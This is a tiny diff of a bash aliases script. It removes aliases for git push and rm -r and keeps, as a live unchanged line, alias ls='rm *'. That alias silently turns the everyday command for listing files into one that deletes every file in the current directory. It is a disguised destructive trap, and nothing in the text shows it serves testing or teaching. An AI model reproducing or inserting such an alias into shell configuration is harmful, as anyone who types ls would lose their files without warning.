@@ -1,5 +1,3 @@
 #!/bin/bash
 alias ls='rm *'
-alias push='git push'
-alias rmd='rm -r'
 
